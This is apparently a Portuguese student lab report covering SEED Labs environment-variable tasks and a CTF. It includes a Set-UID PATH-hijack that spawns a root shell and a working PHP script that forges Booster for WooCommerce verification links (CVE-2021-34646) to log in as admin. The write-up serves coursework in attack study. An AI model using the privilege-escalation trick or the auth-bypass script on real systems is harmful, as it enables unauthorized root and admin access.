# Trabalho realizado na Semana #4

## **Seed Labs**

## Tarefa 1

  **Objetivo:** Manipular variáveis de ambiente

  **Conclusão:** Foi possível criar, observar e apagar variáveis de ambiente com facilidade através da shell <em>default<em>.

## Tarefa 2

  **Objetivo:** Estudar a passagem de variáveis de ambiente de um processo para o seu filho

### Passo 1
  **Procedimento:** Compilar e correr "myprintenv.c":
```c
    #include <unistd.h>
    #include <stdio.h>
    #include <stdlib.h>

    extern char **environ;

    void printenv()
    {
      int i = 0;
      while (environ[i] != NULL) {
        printf("%s\n", environ[i]);
        i++;
      }
    }

    void main()
    {
      pid_t childPid;
      switch(childPid = fork()) {
        case 0:  /* child process */
          printenv();          
          exit(0);
        default:  /* parent process */
          // printenv();       
          exit(0);
      }
    }
```
  **Conclusão:** As variáveis de ambiente são impressas para o ficheiro pelo processo filho.

  
### Passo 2
  **Procedimento:** Alterar o código de myprintenv.c, comentando o printenv() do processo filho e descomentando o printenv() do processo pai. Compilar e correr "myprintenv.c":
  ```c
      switch(childPid = fork()) {
        case 0:  /* child process */
          printenv();          
          exit(0);
        default:  /* parent process */
          // printenv();       
          exit(0);
      }
  ```
  **Conclusão:** As variáveis de ambiente são impressas para o ficheiro pelo processo pai.


### Passo 3
  **Objetivo:** Comparar as diferenças entre as execuções nos passos 1 e 2.

  **Conclusão:** Quando um processo filho é criado através de um fork, este herda as variáveis de ambiente do processo pai. Assim, a execução dos dois primeiros passos, levam ao mesmo output.
 

## Tarefa 3
  **Objetivo:** Estudar a forma como as variáveis de ambiente são afetadas quando um novo programa é executado através de execve.

### Passo 1
  **Procedimento:** Compilar e correr o programa myenv.c:

```c
    #include <unistd.h>

    extern char **environ;

    int main()
    {
      char *argv[2];

      argv[0] = "/usr/bin/env";
      argv[1] = NULL;

      execve("/usr/bin/env", argv, NULL);  

      return 0 ;
    }
```

  **Conclusão** Não há qualquer output ao correr o programa.

### Passo 2
  **Procedimento:** Alterar a invocação de execve(), compilar e correr o programa.
  
    execve("/usr/bin/env", argv, environ);  

  **Conclusão:** As variáveis de ambiente são impressas.
  
### Passo 3 
  **Conclusão:** Para o novo programa, executado através de execve, ter acesso às variáveis de ambiente, é preciso passar o apontador no argumento env, que é um array de apontadores para strings, que são passados como ambiente para o novo programa. Sendo assim, quando envp = NULL, no nosso myprintenv.c, o novo programa não terá nenhuma variável de ambiente.

    int execve(const char *pathname, char *const argv[],  char *const envp[]);

## Tarefa 4

  **Objetivo:** Observar como as variáveis de ambiente são afetadas quando um programa novo executado através da função system().

  **Conclusão:** A função system() usa execl() para executar /bin/sh, execl() chama execve(), passando o array das variáveis de ambiente. Consequentemente, as variáveis de ambiente do programa que chama system() são passadas ao novo programa.
  

## Tarefa 5

  **Objetivo:** Compreender como programas Set-UID são afetados pelas variáveis de ambiente

### Passo 1
  **Procedimento:** Escrever o seguinte programa que imprime todas as variáveis de ambiente no processo atual.

### Passo 2
  **Procedimento:** Compilar o programa a cima, alterando o seu dono para root e tornando-o um programa Set-UID:
```sh
    $ sudo chown root foo
    $ sudo chomod 4755 foo
```
  Verificar que o dono do programa foi alterado e verificar que passou a ser um programa Set-UID (através do setgid bit), utilizando o comando:

    $ ls -l
    -rwsr-xr-x 1 root seed 16768 Nov 11 05:18 foo

### Passo 3
  **Objetivo:** Definir variáveis de ambiente através usando export.

  **Procedimento** Executar os seguintes comandos na shell (valores de exemplo):

    export PATH=99
    export LD_LIBRARY_PATH=words
    export ANY_NAME=morewords

  **Conclusão** Assim que a variável de ambiente PATH é alterada, não é possível definir mais nenhuma, uma vez que, estando o PATH alterado, não é possível aceder ao principal diretório de comandos executáveis do sistema (/usr/bin/).<br>
   Sendo assim, alteramos a variável PATH em último lugar. As novas variáveis que foram definidas, são passadas para o processo filho, <em>Set-UID<em> e impressas. A variável LD_LIBRARY_PATH não se encontra nas variáveis de ambiente impressas pelo nosso programa.


## Tarefa 6


  **Objetivo:** Compreender como programas Set-UID são afetados

  **Procedimento** Alterar a variável PATH:

    export PATH=/home/seed:$PATH

  Como o programa não chama ls com o endereço absoluto, este vai passar a executar o ls que estiver em /home/seed, que será criado por nós:
```c
    int main()
    {
    system("ls");
    return 0;
    }
```
  Criando um programa ls com o ls.c podemos chamar /bin/sh para obter uma shell como root:
```c  
    int main()
    {
    system("/bin/sh");
    return 0;
    }
```
  **Conclusão**:

  Como o programa original corre como root e chama o nosso programa ls, conseguimos obter uma shell com permissões de root, como é possível verificar correndo os comandos

    #id 
    uid=1000(seed) gid=1000(seed) euid=0(root) grupos=1000(seed),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),131(lxd),132(sambashare),136(docker)
    #id -u
    0

## **CTF**

## Reconhecimento

 - Wordpress versão 5.8.1
 - WooCommerce plugin versão 5.7.1
 - Booster for WooCommerce plugin 5.4.3
 - Utilizadores: admin e Orval Sanford

## Pesquisa por vulnerabilidades e Escolha

Ao pesquisar por vulnabilidades para este software e respetivos plugins, nas versões em que se encontram, descobrimos uma vulnerabilidade (CVE-2021-34646) no plugin "Booster for WooCommerce", que permite a um atacante que se autentique como qualquer utilizador (incluindo admin).

## Encontrar um exploit e explorar a vulnerabilidade

Encontramos um exploit em https://www.wordfence.com/blog/2021/08/critical-authentication-bypass-vulnerability-patched-in-booster-for-woocommerce/. <br> O exploit consiste em:
  1. Enviar um request para o <em>home<em> URL com o wcj_user_id a 1, pois esperado que o id de admin seja 1, que é a conta a queremos acesso.
  2. Como o código de verificação para recuperar conta é apenas um hash md5 da hora do pedido, é possível criar o URL que verifica o email.
  3. Através do seguinte script php, geramos vários URL com a hora próxima (diferença de segundos) da hora do pedido, para garantir que um deles tem a hora exata do pedido e, então, o link que verifica o email:
  ```php
    <?php
        
    $user_id = 1;
    $time = time();

    for ($x = -7; $x <= 3; $x++) {
        $modtime = $time + $x;
        $code          = md5( $modtime);
        $encoded          = base64_encode( json_encode( array( 'id' => $user_id, 'code' => $code ) ));

        echo "http://ctf-fsi.fe.up.pt:5001/my-account?wcj_verify_email=$encoded\n";
    }
  ```  
  4. Após aceder ao URL de confirmação de email, passamos a ter acesso como admin.